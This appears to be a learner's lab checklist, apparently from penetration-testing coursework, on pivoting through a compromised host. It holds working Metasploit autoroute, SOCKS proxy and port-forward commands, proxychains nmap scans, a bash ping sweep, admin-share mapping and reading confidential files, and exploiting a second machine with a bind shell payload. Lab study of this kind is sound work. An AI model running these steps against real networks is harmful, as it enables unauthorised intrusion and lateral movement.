### 🔁 Pivoting & Internal Enumeration – Checklist

**Very Important**:
`proxychains nmap demo1.ine.local -sT -Pn -sV -p 445`
Here -sT is must, else it won't scan the target properly while scanning internal targets.

#### 📍 Initial Step
- [ ] Check `/etc/hosts` on any machine you gain access to  
  → Look for internal IPs or hostnames for possible pivot targets.

#### 🔀 Setup Pivoting (Routing Through Compromised Host)

- [ ] **Create internal route**  
  `meterpreter> run autoroute -s 10.2.26.0/24`  
  → Routes traffic to internal subnet through current session.

#### 🧦 Set Up Proxy for Pivoting

- [ ] **Start SOCKS proxy module**  
  `use auxiliary/server/socks_proxy`  
  - `set VERSION 4a`  
  - `set SRVPORT 9060`  
  → Check `proxychains4.conf` to ensure port matches.

- [ ] **Run the module**  
  `exploit`  
  → Starts SOCKS proxy in background.

- [ ] **Use proxychains to access internal hosts**  
  `proxychains nmap <ip-3> -sT -Pn -sV -p 445`  
  → Scan internal machine via pivoted connection.

#### 🧬 Migration & Enumeration

- [ ] **Migrate to explorer.exe for stability**  
  `meterpreter> migrate -N explorer.exe`  
  → Ensures more stable interaction with system.

- [ ] **Open Windows shell**  
  `shell`  
  → Switch to native command prompt.
  
#### 📁 Enumerate Internal Shares from Pivoted Host

- [ ] **List available shares**  
  `net view <ip-3>`  
  → Shows accessible shares from machine-3.

- [ ] **Map shared folder to a drive**  
  `net use D: \\<ip-3>\Documents`  
  `net use K: \\<ip-3>\K$`

- [ ] **Access mapped drives**  
  `dir D:`  
  → Browse shared folder contents.

```
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
```

---

## Pivoting Checklist

- **Concept**:  
  Port forwarding redirects traffic from a port on target system (t1) to a port on another target system (t2) via our local machine.

- **Steps**:  
  1. Exploit initial target (e.g., Rejetto) and get a meterpreter session on t1.  
  2. Add route for target subnet:  
     ```
     meterpreter> run autoroute -s <t1-subnet>
     ```  
     Example:  
     ```
     run autoroute -s 10.5.22.0/20
     ```  
  3. Forward port from local to t2:  
     ```
     meterpreter> portfwd add -l 1234 -p 80 -r <t2-ip>
     ```  
     - `-l` local port on t1  
     - `-p` remote port on t2  
     - `-r` remote IP (t2)  
  4. Scan forwarded port locally:  
     ```
     nmap -sV -p 1234 localhost
     ```  
  5. If service found (e.g., BadBlue on port 80), use corresponding exploit on t2 via msf.  
     - Set payload to `windows/meterpreter/bind_tcp`  
     - Set port to 80  
     - Set IP to t2 IP  
  6. Get shell on t2.

---

## Linux Scanning for internal Hosts:
![[Pasted image 20250810162014.png]]
![[Pasted image 20250810161919.png]]
- Here we got meterpreter access to machine t1. 
- t1 is a linux machine and we are using meterpreter(php/linux). 
- `ip addr` --> shows a new interface eth1 which means there is a internal network exist. 
- We have to identify all the other machines in the internal network to pivot. 

![[Pasted image 20250810162212.png]]
- Using a bash script we have identified all the active hosts in the internal network. 
```
for i in {1..254}; do ping -c 1 -W 1 192.160.237.$i &>/dev/null && echo "192.160.237.$i is up"; done
```
- As you can see above, are bruteforcing the eth1 ip range, as it is the internal network.
- Now we have to use msf autoroute module to add route. put current session in bg.
- `meterpreter> run autoroute -s 192.160.237.0/24` --> all data sent to any host within this network will be sent from Attacker machine -> Meterpreter (t1) -> t2 (or any host in 192.160.237.0/24 )
![[Pasted image 20250810163948.png]]
- We can use portscan msf module and scan entire subnet for open ports.
- Or else we can use the identified active hosts from the bash script.
![[Pasted image 20250810164228.png]]
- As we have already identified .3 is the active host, we can also scan it directly.
- After identifying open ports, we have to use socks_proxy msf module to scan the internal machine from our own machine.
 ![[Pasted image 20250810165503.png]]
- Here we are configuring socks_proxy. 
![[Pasted image 20250810165552.png]]
- In proxychains4.conf file add this line at last. 
- Now perform nmap scanning. 
![[Pasted image 20250810165637.png]]
- Here we have successfully scanned, the internal machine t2 from our machine.
- Version scan here below.
![[Pasted image 20250810165813.png]]

#### Alternative Methods:
```
upload /root/static-binaries/nmap /tmp/nmap
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
```
- We can also upload the nmap binary to target machine (If your machine have the static-binaries).


**Error Fixing**:
- After pivoting , when u scan using proxychain nmap and if you got this error, Try -Pn
![[Pasted image 20250810165421.png]]

Fix:
![[Pasted image 20250810165439.png]]


---

## Windows Pivoting:
![[wp1.png]]
- Here we can see that there aren't any additional interfaces showing.
- Now we can use msf `arp_scanner` to scan the entire subnet.
![[wp2.png]]
- Here we have identified the active hosts.


